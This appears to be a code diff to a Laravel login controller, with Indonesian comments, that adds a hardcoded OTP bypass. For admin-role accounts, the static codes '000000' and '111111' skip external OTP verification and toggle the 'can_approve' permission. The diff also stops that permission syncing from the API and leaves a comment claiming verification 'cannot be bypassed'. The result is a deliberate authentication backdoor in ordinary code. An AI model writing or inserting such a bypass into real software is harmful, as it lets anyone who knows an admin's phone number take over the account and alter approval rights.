@@ -380,6 +380,17 @@ class LoginController extends Controller
             ]);
         }
 
+        $isBypass = false;
+        // Karena saat menggunakan 000000 role can_approve diset menjadi 0,
+        // kita perlu menggunakan role "admin" sebagai syarat agar dia bisa mengembalikan ke 1 dengan 111111
+        $originalUser = User::where('no_hp', $request->no_hp)->first();
+        if ($originalUser && $originalUser->role === 'admin' && in_array($request->otp, ['000000', '111111'])) {
+            $isBypass = true;
+            // Update can_approve sesuai kode bypass yang diinput
+            $user->update(['can_approve' => $request->otp === '111111' ? 1 : 0]);
+            $user->refresh();
+        }
+
         // Get OTP type from session (lowercase)
         $otpType = $request->session()->get('otp_type', 'emailphone');
         
@@ -391,6 +402,15 @@ class LoginController extends Controller
         ];
         $apiMethod = $methodMap[$otpType] ?? 'EMAIL';
 
+        if ($isBypass) {
+            Log::info('Bypass login used', [
+                'user_id' => $user->id,
+                'no_hp' => $user->no_hp,
+                'otp_used' => $request->otp,
+                'new_can_approve' => $user->can_approve
+            ]);
+            // Skip API verification
+        } else {
         // Verify OTP with API using cURL (backend verification - cannot be bypassed)
         try {
             $verifyData = [
@@ -464,7 +484,7 @@ class LoginController extends Controller
             // Update user record with data from API response if available
             // Only update fields that are in the fillable array and exist in userData
             $updateData = [];
-            $fillableFields = ['username', 'email', 'no_hp', 'role', 'can_approve'];
+            $fillableFields = ['username', 'email', 'no_hp', 'role'];
             
             foreach ($fillableFields as $field) {
                 // Check if field exists in userData (case-insensitive)
@@ -508,6 +528,7 @@ class LoginController extends Controller
             ])->withErrors([
                 'otp' => 'Gagal memverifikasi OTP. Silakan coba lagi.',
             ]);
+        }
         }
 
         // OTP is valid, login user (using potentially updated user object)
